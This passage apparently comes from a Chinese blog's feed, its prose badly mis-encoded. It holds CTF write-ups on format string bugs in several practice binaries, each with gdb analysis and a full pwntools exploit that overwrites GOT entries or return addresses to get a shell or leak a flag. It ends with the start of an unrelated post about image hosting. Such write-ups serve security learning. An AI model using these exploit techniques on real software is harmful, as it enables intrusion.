src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯éœ€è¦æ³„æ¼ä¸€ä¸‹æ ˆåœ°å€espï¼Œå› ä¸ºå…¶æ ˆæ˜¯å˜åŒ–çš„ã€‚æ³„éœ²ä»¥åï¼Œä¹Ÿè·å–ä¸€ä¸‹ebp2çš„å€¼ï¼Œç„¶åï¼ˆebp2- esp ï¼‰/4 ä¹Ÿå°±ç¡®å®šåˆ°äº†ï¼Œmainçš„ebpå€¼ï¼ˆebp3ï¼‰å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»å€¼ã€‚</strong>ç„¶åå†æ¬¡åˆ©ç”¨printfå‡½æ•°æ ¹æ®è¿™ä¸ªåç§»æ¥è¿›è¡Œæ”¹å†™sleep gotä¸Šçš„å€¼ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./fsb&#39;)# s = ssh(#     host=&quot;pwnable.kr&quot;,#     port=2222,#     user=&quot;fsb&quot;,#     password=&quot;guest&quot;# )# io = s.run(&quot;/home/fsb/fsb&quot;)# io = shell.run(&quot;/home/fsb/fsb&quot;)sleep_got = 0x0804a008info(&#39;--------leak stack base:-------&#39;)io.recvuntil(&#39;strings(1)\n&#39;)io.sendline(&#39;%14$p&#39;)io.recvuntil(&#39;0x&#39;)stack_base = int(io.recv(8),16) - 80print(hex(stack_base))info(&#39;--------leak the point to main ebp:-------&#39;)io.recvuntil(&#39;strings(2)\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)point = int(io.recv(8),16)print(hex(point))info(&#39;--------write sleep_got to main_ebp :-------&#39;)io.recvuntil(&#39;strings(3)\n&#39;)key1 = 0x0804A008payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;io.sendline(payload)info(&#39;--------write tag to sleep_got :-------&#39;)tag = 0x869Foffset = (point - stack_base) / 4payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)io.recvuntil(&#39;strings(4)\n&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="ä¿æŠ¤å’Œarch-6"><a href="#ä¿æŠ¤å’Œarch-6" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ-8"><a href="#idaåˆ†æ-8" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>è¿™ä¸€å¤„ä¼šè®©æ ˆçš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>è¿™ä¸€å¤„å­˜åœ¨æ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆæ¼æ´å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±æ˜¯ï¼šæ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»<code>/bin/sh</code>å³å¯ã€‚<br>ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ï¼‰</p><h3 id="gdbåˆ†æ-2"><a href="#gdbåˆ†æ-2" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´ï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚</p><p>æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š</p><ul><li>æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰</li><li>åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€</li></ul><p>ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚<br>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚<br>ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚</p><p>æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªæ¡†æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠç¬¬äºŒä¸ªæ¡†æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªæ¡†æ¡†çš„æ ˆæŒ‡é’ˆï¼š</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªè¿‡ç¨‹åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚</p><p>æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€ï¼š</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå°±å¯ä»¥å†™systemçš„å†…å­˜åœ°å€ä¸Šgotäº†ï¼š</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>è¿™æ ·å†ä¼ è¿‡å»ä¸€ä¸‹<code>/bin/sh</code>å³å¯ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continue# io = def fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š</p><ul><li>æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨</li><li>å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf</li><li>å•æ¬¡printfå¤šæ¬¡å†™å…¥</li><li>æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚<h3 id="ç»“è®ºå’Œæ”¶è·"><a href="#ç»“è®ºå’Œæ”¶è·" class="headerlink" title="ç»“è®ºå’Œæ”¶è·"></a>ç»“è®ºå’Œæ”¶è·</h3></li></ul><p>è¿™ä¸ªé¢˜æ•™ä¼šæˆ‘ä¸€å®šè¦<strong>çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®</strong>,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼šæœ‰éšæœºæ ˆæƒ…å†µçš„é¢˜ç›®ï¼Œå°½é‡è¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„ibcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,è¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="ä¿æŠ¤å’Œarch-7"><a href="#ä¿æŠ¤å’Œarch-7" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>CANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partial</code></pre><h3 id="idaåˆ†æ-9"><a href="#idaåˆ†æ-9" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s){  char *v1; // eax  char *result; // eax  puts(&quot;...&quot;);  v1 = strtok(s, &quot;|&quot;);  printf(v1);  while ( 1 )  {    result = strtok(0, &quot;|&quot;);    if ( !result )      break;    printf(result);  }  return result;}</code></pre><p>è¿™é‡Œå› ä¸ºç”¨strtokåšå¤„ç†ï¼Œåªæœ‰ä¸€æ¬¡çš„ä¼ é€æœºä¼šï¼Œpayloadéœ€è¦ç”¨<code>|</code>    åˆ†å‰²æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å®Œæˆæ¯æ¬¡çš„printfçš„æ¼æ´åˆ©ç”¨ï¼Œç¨å¾®éº»çƒ¦äº†ä¸€ä¸‹ã€‚<br>å¹¶ä¸”å­˜åœ¨åé—¨å‡½æ•°ï¼š</p><pre><code>.text:080485AB                 push    ebp.text:080485AC                 mov     ebp, esp.text:080485AE                 sub     esp, 8.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);.text:080485B1                 sub     esp, 0Ch.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;.text:080485B9                 call    _system.text:080485BE                 add     esp, 10h.text:080485C1                 nop.text:080485C2                 leave.text:080485C3                 retn</code></pre><p>è¿™ä¸‹å¯ä»¥ç›´æ¥æ”¹ret addresså³å¯ã€‚</p><h3 id="gdbåˆ†æ-3"><a href="#gdbåˆ†æ-3" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>å…ˆè§‚å¯Ÿä¸€ä¸‹ebpé“¾æ˜¯å¦å­˜åœ¨ ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>æ˜¯å­˜åœ¨çš„ï¼Œç„¶åç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ”¹ebp2é‡Œé¢çš„å€¼ï¼š 0xffffd338 æ—¶ï¼Œå‘ç°ä¸‹é¢çš„ç¬¬äºŒä¸ªåªéœ€è¦æ”¹ä¸€ä¸ªå­—èŠ‚å³å¯ï¼Œç„¶åç›®æ ‡å°±æ˜¯æ”¹æˆè¿™ä¸ªæ ˆåœ°å€äº†ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>ç„¶åæ¥ç€åˆ©ç”¨æ¼æ´ï¼Œæ”¹ä¸€ä¸‹è¿”å›åœ°å€åˆ°åé—¨å‡½æ•°å³å¯ã€‚</p><p>ï¼ˆè¿™ä¸ªé¢˜è‡ªå·±åœ¨åšçš„æ—¶å€™ï¼Œå…ˆæ˜¯è¯•ç€åˆ©ç”¨ç¬¬äºŒä¸ªçš„0xffffd2f8 ï¼Œè¿™ä¸ªé“¾å‘ç°æœ¬åœ°å¯ä»¥æ‰“é€šï¼Œè¿œç¨‹æ˜¯ä¸è¡Œçš„ï¼Œè¿™å°±æ˜¯ç¯å¢ƒå› ç´ äº†ï¼Œè¿œç¨‹ç”±äºlibcç‰ˆæœ¬çš„ä¸åŒï¼Œæ ˆç»“æ„ä¹Ÿæ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥åšé¢˜è¿˜æ˜¯ä¼˜å…ˆï¼Œè€ƒè™‘ebpé“¾ï¼Œç„¶åæ²¡æ³•åˆ©ç”¨äº†ï¼Œåœ¨è€ƒè™‘å……åˆ†åˆ©ç”¨æ ˆæ•°æ®ï¼Œè¿™ä¸ªé€šå¸¸ä¹Ÿæ˜¯å‡ºé¢˜äººç²¾å¿ƒè®¾è®¡çš„æ ˆç»“æ„ï¼Œè®©ä½ æœ‰æ•°æ®å¯ä»¥åˆ©ç”¨ã€‚ï¼‰</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;system_addr = 0x080485B4tag1 = 0x4ctag2 = 0x85abio = process(&#39;./xman_2019_format&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27012)payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)while True:    try:        io.recvuntil(&#39;...\n...\n&#39;)        io.sendline(payload)        sleep(0.1)        io.recvuntil(&#39;~&#39;)        io.sendline(&#39;ls&#39;)        io.recvline()        io.recvline()        io.interactive()        break    except EOFError :        io.close()        io = process(&#39;./xman_2019_format&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre><p>éœ€è¦çˆ†ç ´æ ˆã€‚</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="ä¿æŠ¤å’Œarch-8"><a href="#ä¿æŠ¤å’Œarch-8" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•got hijackäº†</p><h3 id="idaåˆ†æ-10"><a href="#idaåˆ†æ-10" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdbåˆ†æ-4"><a href="#gdbåˆ†æ-4" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>ç¨‹åºå…ˆè¯»å…¥äº†flagæ–‡ä»¶ï¼Œè‡ªå·±å¯ä»¥å†™ä¸€ä¸ªflagæ–‡ä»¶æµ‹è¯•ï¼Œå¹¶ä¸”gdbè·Ÿéšï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>å…¶ä¼šè¢«è¯»åˆ°å †ä¸Šã€‚ç´§æ¥ç€è·Ÿåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¤„ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹è¿™ä¸ªå †åœ°å€æ˜¯å¦è¢«ç¨‹åºæ“ä½œä¿®æ”¹äº†ï¼š</p><pre><code>gdb-peda$ x/s 0x8050b700x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>å‘ç°å¹¶æ²¡æœ‰ï¼Œé‚£å°±å¾ˆç®€å•äº†ã€‚æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œåœ¨æ ˆä¸Šæ„é€ å‡ºè¿™ä¸ªå­˜æ”¾flagçš„å †åœ°å€ï¼ˆè®¡ç®—æ–¹å¼å°±æ˜¯åœ¨æ­¤æ—¶çš„æ ˆä¸Šæ‰¾ä¸€ä¸ªåœ°å€æ¥è®¡ç®—åç§»è·å–ï¼‰ã€‚<br>ç¬¬ä¸€æ­¥ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>å…ˆä¿®æ”¹ebp2ä¸Šå­˜æ”¾çš„å€¼ï¼Œæ”¹æˆåé¢é‚£ä¸ªæ¡†æ¡†å¯¹åº”çš„æ ˆåœ°å€ï¼Œç„¶ååœ¨åšå¤„ç†ï¼š</p><pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>æ­¤æ—¶å†ä¿®æ”¹ebp1ä¸Šçš„å€¼ï¼Œæ”¹æˆåˆšåˆšçš„å †åœ°å€ ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>è¿™æ ·expå†™çš„æ—¶å€™ï¼Œæ‰¾å¥½åç§»%sä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = remote(&#39;node3.buuoj.cn&#39;,27816)io = process(&#39;./1&#39;)io.recvuntil(&#39;Magic echo Server&#39;)io.recvuntil(&#39;=====================\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)flag = int(io.recv(8),16)print(hex(flag))key = int((hex(flag))[-4:],16) - 32 -12 -4print(&#39;key&#39;+ hex(key))# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%6$p&#39;)io.recvuntil(&#39;0x&#39;)stack_point = int(io.recv(8),16) + 16tag1 = int((hex(stack_point))[-2:],16)print(hex(tag1))payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1&#39;)payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;2&#39;)io.sendline(&#39;%18$s&#39;)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ &quot;&gt;&lt;a href=&quot;#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ &quot; class=&quot;headerlink&quot; title=&quot;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ &quot;&gt;&lt;/a&gt;æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´é¢˜ç›®ç»ƒä¹ &lt;/h1&gt;&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="å­¦ä¹ è®°å½•" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ</title>
    <link href="http://chumen77.xyz/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <id>http://chumen77.xyz/2020/03/12/ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ/</id>
    <published>2020-03-12T15:17:10.000Z</published>
    <updated>2020-03-13T02:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ"><a href="#ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ" class="headerlink" title="ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ"></a>ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>è‡ªå·±çš„ä»¥å‰ç”³è¯·è¿‡ä¸€ä¸ªä¸ƒåƒäº‘åšè‡ªå·±çš„å›¾åºŠï¼Œä»Šæ™šå†™åšå®¢å‘ç°ï¼Œè‡ªå·±ä¸Šä¼ ä¸ä¸Šå›¾ç‰‡ï¼Œå¹¶ä¸”ç”¨upicå¯¼å‡ºæ¥çš„é“¾æ¥æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚æŸ¥äº†å¾ˆä¹…çš„åŸå› ï¼Œå‘ç°æ˜¯ä¸ƒåƒç‰›åŸæ¥ç»™æˆ‘åˆ†é…çš„å…è´¹å¤–é“¾åŸŸåç»™æˆ‘æ–­ç”¨äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>å°±æ˜¯è¿™ä¸ªæ²¡äº†ï¼Œè‡ªå·±æ’é”™ï¼Œæ’äº†åŠå¤©æ‰å‘ç°ã€‚æ˜¯åœ¨è¿™é‡Œæ‰¾åˆ°çš„ï¼Œå¥½éšè”½ã€‚ã€‚ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>ç„¶åå°±åœ¨æ–‡ä»¶ç®¡ç†é‚£é‡Œå‘ç°ï¼Œç½‘ç«™æç¤ºè¯´å¦‚æœæ— æ³•æ˜¾ç¤ºå›¾ç‰‡ï¼ŒåŠ è½½æ…¢ï¼Œå¯ä»¥åŠ ä¸€ä¸ªåŸŸåã€‚ç„¶åæˆ‘å°±å°è¯•åŠ äº†ä¸€ä¸ªï¼Œç„¶åå°±ä¿®å¤å¥½äº†ã€‚</p><h2 id="ä¿®å¤è¿‡ç¨‹"><a href="#ä¿®å¤è¿‡ç¨‹" class="headerlink" title="ä¿®å¤è¿‡ç¨‹"></a>ä¿®å¤è¿‡ç¨‹</h2><h3 id="ç»‘å®šåˆ›å»ºåŸŸå"><a href="#ç»‘å®šåˆ›å»ºåŸŸå" class="headerlink" title="ç»‘å®šåˆ›å»ºåŸŸå"></a>ç»‘å®šåˆ›å»ºåŸŸå</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxxä¹Ÿå°±æ˜¯å¡«ä½ çš„åŸŸåï¼Œå‰é¢çš„å¯ä»¥è‡ªå®šä¹‰ã€‚ç‚¹å‡»æ·»åŠ åä¸‹é¢æ€»æ˜¯ä¼šè‡ªåŠ¨åˆå¼¹å‡ºä¸€ä¸ªç©ºç™½çš„æ¡†ï¼Œç‚¹å‡»åé¢çš„åˆ é™¤ï¼Œå¦åˆ™ï¼Œå¾€ä¸‹æ»‘ä½ ä¼šå‘ç°å°±æ˜¯åˆ›å»ºä¸äº†è¿™ä¸ªè®°å½•ã€‚<br>åˆ›å»ºæˆåŠŸåï¼Œä¼šæç¤ºä½ å¤åˆ¶<strong>CNAME</strong>ï¼Œå¤åˆ¶ä¸€ä¸‹ï¼Œå»å¾€ä½ è‡ªå·±çš„åŸŸåç½‘ç«™ï¼Œæˆ‘ç”¨çš„æ˜¯é˜¿é‡Œäº‘ã€‚</p><h3 id="å»è‡ªå·±çš„dnsè§£æå¹³å°"><a href="#å»è‡ªå·±çš„dnsè§£æå¹³å°" class="headerlink" 